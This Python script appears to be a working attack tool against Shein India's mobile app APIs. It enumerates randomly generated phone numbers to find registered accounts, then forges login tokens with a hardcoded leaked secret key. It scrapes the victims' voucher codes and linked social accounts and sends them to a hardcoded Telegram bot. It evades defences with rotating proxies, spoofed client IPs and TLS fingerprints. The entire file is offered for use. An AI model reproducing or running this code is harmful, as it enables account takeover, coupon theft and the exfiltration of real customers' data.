import asyncio
import random
import logging
import requests
import aiohttp
import time
import os
import sys
import json
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote_plus
import urllib3
import threading
import tls_client

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
]

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ================= USER AGENTS (From crux.py) =================
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
]

# ================= CONFIGURATION =================
# Core Settings
BATCH_SIZE = 100          # Reduced from 1000 to avoid 429
SECRET_KEY = "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg"
BASE_URL_CREATOR = "https://shein-creator-backend-151437891745.asia-south1.run.app"
BASE_URL_UAAS = "http://api.services.sheinindia.in/uaas"
BASE_URL_RIL = "https://api.services.sheinindia.in/rilfnlwebservices/v2/rilfnl"

HITS_FILE = "super_hits.txt"
PROXY_FILE = "proxy.txt"
PROXY_SCRAPE_KEY = "" # PUT YOUR PROXYSCRAPE API KEY HERE to auto-whitelist ID

# Rate Limit Settings
REQUEST_DELAY = 0.3
MAX_RETRIES = 3

# Modern Windows Terminal ANSI Support
if os.name == 'nt':
    os.system('color')

# Colors
CYAN = '\033[96m'
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
WHITE = '\033[97m'
GREY = '\033[90m'
RESET = '\033[0m'
BOLD = '\033[1m'

# Proxy Globals (Round Robin from yrtr.py)
PROXY_LIST = []
PROXY_INDEX = 0
PROXY_ENABLED = True
PROXY_LOCK = threading.Lock()

# ================= LOGGING =================
logging.basicConfig(level=logging.FATAL)
logger = logging.getLogger(__name__)

# ================= PROXY HELPER FUNCTIONS (From yrtr.py) =================
def load_proxies():
    """Load proxies from proxy file"""
    global PROXY_LIST, PROXY_ENABLED
    
    if not os.path.exists(PROXY_FILE):
        print(f"{YELLOW}[!] Proxy file '{PROXY_FILE}' not found. Running without proxies.{RESET}")
        PROXY_ENABLED = False
        return
    
    try:
        with open(PROXY_FILE, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        
        valid_proxies = []
        for proxy in proxies:
             # Basic formats
            if re.match(r'^\d+\.\d+\.\d+\.\d+:\d+$', proxy):  # IP:PORT
                valid_proxies.append(f"http://{proxy}")
            elif proxy.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
                valid_proxies.append(proxy)
            elif ':' in proxy and '@' in proxy:  # user:pass@ip:port
                valid_proxies.append(f"http://{proxy}")
            # Handle user:pass:ip:port format if present (common in earlier files)
            elif re.match(r'^[\w.-]+:\d+:[^:]+:[^:]+$', proxy): 
                 parts = proxy.split(':')
                 user = quote_plus(parts[2])
                 pwd = quote_plus(parts[3])
                 valid_proxies.append(f"http://{user}:{pwd}@{parts[0]}:{parts[1]}")
        
        PROXY_LIST = valid_proxies
        
        if PROXY_LIST:
            print(f"{GREEN}[+] Loaded {len(PROXY_LIST)} proxies from {PROXY_FILE}{RESET}")
            PROXY_ENABLED = True
        else:
            print(f"{YELLOW}[!] No valid proxies found in {PROXY_FILE}{RESET}")
            PROXY_ENABLED = False
            
    except Exception as e:
        print(f"{RED}[!] Error loading proxies: {e}{RESET}")
        PROXY_ENABLED = False

def get_next_proxy():
    """Get next proxy in round-robin fashion"""
    global PROXY_INDEX
    
    if not PROXY_ENABLED or not PROXY_LIST:
        return None
    
    with PROXY_LOCK:
        proxy = PROXY_LIST[PROXY_INDEX]
        PROXY_INDEX = (PROXY_INDEX + 1) % len(PROXY_LIST)
    return proxy

def get_proxy_dict():
    """Get proxy dictionary for requests"""
    proxy_url = get_next_proxy()
    if not proxy_url: return None
    return {'http': proxy_url, 'https': proxy_url}

def get_aiohttp_proxy():
    """Get proxy URL for aiohttp"""
    return get_next_proxy()

def normalize_indian_phone(phone):
    if not phone: return None
    phone = str(phone).strip()
    phone = re.sub(r'[^\d+]', '', phone)
    if phone.startswith('+'): phone = phone[1:]
    if phone.startswith('91') and len(phone) > 10: phone = phone[2:]
    if phone.startswith('0'): phone = phone[1:]
    if phone.startswith('0091'): phone = phone[4:]
    if len(phone) == 10 and phone[0] in '6789': return phone
    elif len(phone) > 10:
        phone = phone[-10:]
        if phone[0] in '6789': return phone

    return None

# ================= TELEGRAM ALERTS =================
def send_telegram_alert(message):
    """Send alert to all admin IDs via Telegram"""
    token = os.environ.get("TELEGRAM_BOT_TOKEN", "8293341473:AAEyxmWi84CRBqDOcgKrTgXzOmcqqU2DM1M")
    chat_ids_str = os.environ.get("ADMIN_CHAT_IDS", "7978240971")
    
    if not token or not chat_ids_str:
        return

    chat_ids = [cid.strip() for cid in chat_ids_str.split(",") if cid.strip()]
    
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    
    for chat_id in chat_ids:
        try:
            requests.post(url, json={
                "chat_id": chat_id,
                "text": message,
                "parse_mode": "Markdown"
            }, timeout=10)
        except Exception:
            pass

class SheinEngine:
    def __init__(self):
        # Use tls_client with Android fingerprint (closest match for app traffic)
        self.session = tls_client.Session(
            client_identifier="okhttp4_android_13",
            random_tls_extension_order=True
        )
        self.executor = ThreadPoolExecutor(max_workers=50)
        
        # Added for Terminal UI tracking
        self.total_scans = 0
        self.total_hits = 0
        self.start_time = time.time()
        self.pause_until = 0

        # Proxy statistics
        self.proxy_stats = {
            'total_requests': 0,
            'proxy_requests': 0,
            'failed_proxies': set(),
            'last_proxy_rotation': time.time()
        }

    def rand_ip(self):
        return f"{random.randint(49, 150)}.{random.randint(10, 255)}.{random.randint(10, 255)}.{random.randint(1, 255)}"
    
    def gen_device_id(self):
        return os.urandom(8).hex()

    def gen_phone_batch(self, count):
        return [f"8{random.randint(100000000, 999999999)}" for _ in range(count)]

    def get_client_headers(self):
        """Standard matching headers from crux.py"""
        return {
            'Client_type': 'Android/29',
            'Accept': 'application/json',
            'Client_version': '1.0.8',
            'User-Agent': random.choice(USER_AGENTS),
            'X-Tenant-Id': 'SHEIN',
            'X-Tenant': 'B2C',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Forwarded-For': self.rand_ip()
        }

    # Get Guest Token (From yrtr.py)
    def get_guest_token(self):
        url = f"{BASE_URL_UAAS}/jwt/token/client"
        headers = self.get_client_headers()
        
        proxies = get_next_proxy() if PROXY_ENABLED else None
        self.proxy_stats['total_requests'] += 1
        if proxies:
            self.proxy_stats['proxy_requests'] += 1
        
        try:
            # Fixed Android TLS Fingerprint (matches User-Agent pattern)
            client_id = "okhttp4_android_13"
            # Using self.session if available or create new if headers need rotation per request 
            # (crux.py creates new session implicitly or uses tasks, old_v.py uses explicit session)
            # To be safe and clean, we'll just use self.session configured in __init__ which is okhttp4_android_13
            # OR create a fresh one to be 100% sure. Let's start fresh.
            session = tls_client.Session(client_identifier=client_id, random_tls_extension_order=True)

            resp = session.post(
                url, 
                data="grantType=client_credentials&clientName=trusted_client&clientSecret=secret", 
                headers=headers, 
                timeout_seconds=10,
                proxy=proxies
            )
            if resp.status_code == 200: 
                return resp.json().get('access_token')
            else:
                 # Debug logging
                print(f"{RED}[!] Guest Token Error: {resp.status_code} | {resp.text[:200]}{RESET}")
        except Exception as e:
            print(f"{RED}[!] Token error: {e}{RESET}")
            if proxies and hasattr(e, 'proxy'):
                self.proxy_stats['failed_proxies'].add(str(e.proxy))
        return None

    # Mass Scan Batch (From yrtr.py logic, adapted for terminal)
    async def mass_scan_batch(self, session: aiohttp.ClientSession, guest_token):
        all_numbers = self.gen_phone_batch(BATCH_SIZE)
        hits = []
        
        url = f"{BASE_URL_UAAS}/accountCheck?client_type=Android%2F29&client_version=1.0.8"
        
        async def check_number(phone, retry_count=0):
            try:
                headers = {
                    'Authorization': f'Bearer {guest_token}',
                    'Requestid': 'account_check',
                    'X-Tenant': 'B2C',
                    'Accept': 'application/json',
                    'User-Agent': random.choice(USER_AGENTS),
                    'Client_type': 'Android/29',
                    'Client_version': '1.0.8',
                    'X-Tenant-Id': 'SHEIN',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Forwarded-For': self.rand_ip()
                }
                
                # Add delay
                await asyncio.sleep(REQUEST_DELAY * random.uniform(0.5, 1.5))
                
                proxy_url = get_aiohttp_proxy() if PROXY_ENABLED else None
                
                async with session.post(
                    url, 
                    data=f"mobileNumber={phone}", 
                    headers=headers, 
                    timeout=10, 
                    ssl=False,
                    proxy=proxy_url
                ) as resp:
                    self.total_scans += 1 # Update stats
                    
                    if resp.status == 200:
                        txt = await resp.text()
                        try:
                            j = json.loads(txt)
                            if j.get('success') is True and j.get('encryptedId'):
                                return (phone, j.get('encryptedId'))
                        except:
                            pass
                    
                    elif resp.status == 429:
                        if retry_count < MAX_RETRIES:
                            wait_time = (retry_count + 1) * 2
                            # print(f"{YELLOW}[⏳] 429 Rate Limited - Waiting {wait_time}s...{RESET}")
                            await asyncio.sleep(wait_time)
                            return await check_number(phone, retry_count + 1)
                        else:
                             pass # Max retries
                    
            except Exception as e:
                pass 
            return None
        
        tasks = [check_number(phone) for phone in all_numbers]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if result and isinstance(result, tuple):
                hits.append(result)
        
        return all_numbers, hits

    # Login (From yrtr.py)
    def login(self, phone, enc_id):
        url = f"{BASE_URL_CREATOR}/api/v1/auth/generate-token"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/json",
            "X-Forwarded-For": self.rand_ip()
        }
        payload = {
            "client_type": "Android/29", "phone_number": phone, "secret_key": SECRET_KEY, 
            "user_id": enc_id, "user_name": "CrackedUser", "gender": "FEMALE", "client_version": "1.0.8"
        }
        
        proxies = get_next_proxy() if PROXY_ENABLED else None
        
        try:
            resp = self.session.post(url, json=payload, headers=headers, timeout_seconds=20, proxy=proxies)
            if resp.status_code in [200, 201]: 
                return resp.json().get('access_token')
            else:
                 print(f"{RED}[!] Login Failed: {resp.status_code} - {resp.text[:200]}{RESET}")
        except Exception as e:
            print(f"{RED}[!] Login error: {e}{RESET}")
        return None

    # Scrape (From yrtr.py)
    def scrape(self, token, enc_id):
        results = {"socials": "Not Linked", "coupons": []}
        auth_headers = {
            "Authorization": f"Bearer {token}", 
        }
        
        proxies = get_next_proxy() if PROXY_ENABLED else None
        
        # Main Coupons
        try:
            r = self.session.get(f"{BASE_URL_RIL}/users/{enc_id}/couponbonanza?fields=FULL", 
                                headers=auth_headers, timeout_seconds=10, proxy=proxies)
            if r.status_code == 200:
                for c in r.json().get('coupons', []):
                    results["coupons"].append({
                        'code': c.get('code'), 
                        'amt': c.get('value'), 
                        'exp': c.get('expiry_date')
                    })
        except Exception as e:
            print(f"{RED}Coupon error: {e}{RESET}")
        
        # Creator Coupons
        try:
            r = self.session.get(f"{BASE_URL_CREATOR}/api/v1/user", 
                                headers=auth_headers, timeout_seconds=10, proxy=proxies)
            if r.status_code in [200, 201]:
                j = r.json()
                v = j.get('user_data', {}).get('vouchers', [])
                vd = j.get('user_data', {}).get('voucher_data')
                if vd: v.append(vd)
                for i in v:
                    results["coupons"].append({
                        'code': i.get('voucher_code'), 
                        'amt': i.get('voucher_amount'), 
                        'exp': i.get('expiry_date')
                    })
        except Exception as e:
            print(f"{RED}Creator coupon error: {e}{RESET}")
        
        # Instagram
        try:
            r = self.session.get(f"{BASE_URL_RIL}/users/current", 
                                headers=auth_headers, timeout_seconds=5, proxy=proxies)
            if r.status_code in [200, 201]:
                d = r.json()
                if d.get('socialLoginList'): 
                    results["socials"] = f"LINKED: {d['socialLoginList']}"
        except Exception as e:
            print(f"{RED}Social check error: {e}{RESET}")
        
        # Filter coupons (SVC, SVI, SVH, SVD)
        valid_prefixes = ("SVC", "SVI", "SVH", "SVD")
        results["coupons"] = [
            c for c in results["coupons"] 
            if c.get('code') and c['code'].upper().startswith(valid_prefixes)
        ]
        
        return results

    def crack_scan_hit(self, phone, enc_id):
        """Crack found hit - get vouchers"""
        c_token = self.login(phone, enc_id)
        if not c_token: return None
        return self.scrape(c_token, enc_id)

    def save_hit(self, phone, data):
        if not data.get('coupons'): return
        try:
            with open(HITS_FILE, "a", encoding="utf-8") as f:
                t = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                line = f"[{t}] {phone} | {data['socials']} | Coupons: {len(data['coupons'])}\n"
                for c in data['coupons']:
                    line += f"    -> {c['code']} ({c['amt']})\n"
                line += "-"*40 + "\n"
                f.write(line)
        except Exception as e:
            print(f"{RED}[!] Error saving hit: {e}{RESET}")

# ================= MONITOR =================
async def monitor(engine):
    while True:
        await asyncio.sleep(0.5)
        elapsed = time.time() - engine.start_time
        if elapsed > 0:
            rpm = int(engine.total_scans / (elapsed / 60))
            
            # Formatted status
            proxy_stat = f"{GREEN}ON{GREY}" if PROXY_ENABLED else f"{RED}OFF{GREY}"
            sys.stdout.write(f"\r{BOLD}{CYAN} [GTX PRIME] {GREY}Running... {WHITE}Batch: {BATCH_SIZE} {GREY}| {WHITE}Proxy: {proxy_stat} {GREY}| {WHITE}Total: {engine.total_scans} {GREY}| {GREEN}Hits: {engine.total_hits} {GREY}| {YELLOW}RPM: {rpm} {RESET}")
            sys.stdout.flush()

# ================= MAIN =================
async def main():
    # Header
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{CYAN}{BOLD}")
    print(r"""

                                                     
    """)
    print(f"{YELLOW}        >> Zumba Zumba <<{RESET}")
    print(f"{GREY}    >> Pixels Era<<{RESET}\n")

    # Load proxies
    load_proxies()

    # Get and print public IP (for whitelisting)
    try:
        print(f"{YELLOW}[*] Checking Public IP...{RESET}")
        pub_ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
        print(f"{GREEN}[+] Current Public IP: {pub_ip}{RESET}")
        
        # Auto-Whitelist if Key is present
        if PROXY_SCRAPE_KEY:
            print(f"{YELLOW}[*] Auto-Whitelisting IP on ProxyScrape...{RESET}")
            wl_url = f"https://api.proxyscrape.com/v2/account/datacenter_shared/whitelist?auth={PROXY_SCRAPE_KEY}&type=set&ip[]={pub_ip}"
            wl_resp = requests.get(wl_url, timeout=10)
            if "success" in wl_resp.text.lower() or "true" in wl_resp.text.lower():
                 print(f"{GREEN}[+] IP Whitelisted Successfully! Waiting 10s for propagation...{RESET}")
                 time.sleep(10)
            else:
                 print(f"{RED}[!] Whitelist Failed: {wl_resp.text}{RESET}")
        else:
            print(f"{YELLOW}[!] Whitelist this IP in ProxyScrape if using IP authentication!{RESET}")
            print(f"{GREY}[i] Pro Tip: Add PROXY_SCRAPE_KEY in config to auto-whitelist.{RESET}")

    except Exception as e:
        print(f"{RED}[!] Could not get public IP: {e}{RESET}")

    engine = SheinEngine()
    print(f"{YELLOW}[*] Initializing Engine (v3 Logic)...{RESET}")
    print(f"{YELLOW}[*] Fetching Guest Token...{RESET}")
    
    # Connector for high concurrency
    connector = aiohttp.TCPConnector(limit=1000, ssl=False, ttl_dns_cache=300)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            # Rate Limit Pause handled internally by mass_scan_batch retry, 
            # but if we need a global pause we can check engine.pause_until
            if time.time() < engine.pause_until:
                await asyncio.sleep(1)
                continue

            # 1. Get Token
            token = await asyncio.get_event_loop().run_in_executor(engine.executor, engine.get_guest_token)
            
            if not token:
                await asyncio.sleep(5)
                continue
            
            # 2. Run Batch
            try:
                numbers, hits = await engine.mass_scan_batch(session, token)
                
                # 3. Process Hits
                if hits:
                    for phone, enc_id in hits:
                        print(f"\n{GREEN}[+] HIT FOUND: {phone}{RESET}")
                        engine.total_hits += 1
                        
                        try:
                            # Run synchronous cracking in executor
                            data = await asyncio.get_event_loop().run_in_executor(
                                engine.executor, 
                                lambda: engine.crack_scan_hit(phone, enc_id)
                            )
                            if data:
                                engine.save_hit(phone, data)
                                # print(f"{CYAN}    Data Extracted: {len(data['coupons'])} Coupons | {data['socials']}{RESET}")
                                
                                # Prepare Telegram Message
                                if len(data['coupons']) > 0:
                                    tg_msg = f"*🔥 Choco Mila: {phone}*\n"
                                    tg_msg += f"Socials: `{data['socials']}`\n"
                                    tg_msg += f"Coupons: `{len(data['coupons'])}`\n"
                                    for c in data['coupons']:
                                        tg_msg += f"🎟 `{c['code']}` ({c['amt']})\n"
                                    tg_msg += f"Exp: {c.get('exp', 'N/A')}\n"
                                    
                                    # Send Alert
                                    await asyncio.get_event_loop().run_in_executor(
                                        engine.executor, 
                                        lambda: send_telegram_alert(tg_msg)
                                    )
                        except Exception as e: 
                            print(f"{RED}[!] Hit Processing Error: {e}{RESET}")
            
            except Exception as e:
                 print(f"{RED}[!] Batch Error: {e}{RESET}")
            
            # Small delay
            await asyncio.sleep(0.1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Stopped.{RESET}")





